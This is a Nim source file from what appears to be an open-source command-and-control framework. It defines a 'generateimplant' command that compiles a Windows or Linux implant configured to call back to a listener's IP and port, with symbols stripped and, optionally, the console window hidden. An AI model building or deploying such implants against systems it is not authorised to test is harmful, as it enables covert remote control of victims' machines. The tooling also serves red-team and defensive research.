import osproc, strutils, asyncdispatch, tables

import ../../types
import ../../logging

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  
  var listenerType: string = flags.getOrDefault("type", flags.getOrDefault("t", ""))
  var listenerName: string = flags.getOrDefault("listener", flags.getOrDefault("l", ""))
  var platform: string = flags.getOrDefault("platform", flags.getOrDefault("P", "windows"))
  var ip: string = flags.getOrDefault("ip", flags.getOrDefault("i", ""))
  var port: string = flags.getOrDefault("port", flags.getOrDefault("p", ""))
  var showWindow: bool = parseBool(flags.getOrDefault("showwindow", flags.getOrDefault("s", "no")))
  var autoConnectTime: string = flags.getOrDefault("autoconnect", flags.getOrDefault("t", "5000"))

  # infoLog "generating implant for " & $tcpListener
  if listenerType == "tcp" and ip == "" and port == "":
    errorLog "you must specify and --ip and --port for the tcp client"
    return
  else:
    for listener in server.listeners:
      if listener.title == listenerName:
        infoLog "generating a listener for " & $listener
        ip = listener.ipAddress
        port = $listener.port.uint

  let compileCommand = "nim c -d:client " &
    (if showWindow: "" else: "--app=gui " & " ") & # disable window 
    "--passL:-s" & " " &  
    "-d:release" & " " &  
    "-d:ip=" & ip & " " & 
    "-d:port=" & port & " " & 
    "-d:autoConnectTime=" & autoConnectTime & " " & 
    (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
    "-o:implant" & (if platform == "windows": ".exe " else: " ") & 
    "./src/client/client.nim"

  echo "Running " & compileCommand
  let exitCode = execCmd(compileCommand)

  if exitCode != 0:
    errorLog "failed to build implant, check https://github.com/d4rckh/nimc2/wiki/FAQs"
  else:
    infoLog "saved implant to implant" & (if platform == "windows": ".exe " else: " ") 

let cmd*: Command = Command(
  execProc: execProc,
  name: "generateimplant",
  aliases: @["gi"],
  argsLength: 3,
  usage: @[
    "generateimplant -l:[listenerName] -P:[platform] -t:[autoConnectTimeout]",
    "generateimplant -t:[listenerType] -i:[ip] -p:[port] -P:[platform] -t:[autoConnectTimeout]",
  ],
  description: "Generate an implant",
  category: CCImplants
)